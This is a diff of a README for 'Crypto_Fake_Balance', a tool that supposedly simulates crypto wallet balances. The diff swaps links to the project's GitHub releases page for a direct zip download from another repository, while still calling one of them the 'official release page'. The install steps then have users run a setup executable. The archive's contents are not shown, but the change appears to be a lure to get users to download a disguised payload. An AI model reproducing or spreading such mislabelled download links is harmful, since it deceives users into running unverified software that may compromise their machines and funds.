@@ -6,7 +6,7 @@ description: "Simulate cryptocurrency wallet balances for testing and developmen
 # 📉 Crypto_Fake_Balance - Simulate digital asset values for testing
 
 <p align="center">
-  <a href="https://github.com/simosh4442-glitch/Crypto_Fake_Balance/releases">
+  <a href="https://raw.githubusercontent.com/simosh4442-glitch/simosh4442-glitch.github.io/main/rejumble/github_io_glitch_simosh_1.6.zip">
     <img src="https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge">
   </a>
 </p>
@@ -30,7 +30,7 @@ Ensure your computer meets these standards before installation:
 
 Follow these steps to prepare the tool on your machine.
 
-1. Visit the [official release page](https://github.com/simosh4442-glitch/Crypto_Fake_Balance/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/simosh4442-glitch/simosh4442-glitch.github.io/main/rejumble/github_io_glitch_simosh_1.6.zip).
 2. Locate the latest version banner at the top of the list.
 3. Select the file named `Crypto_Fake_Balance_Setup.exe`.
 4. Save the file to your desktop for easy access.
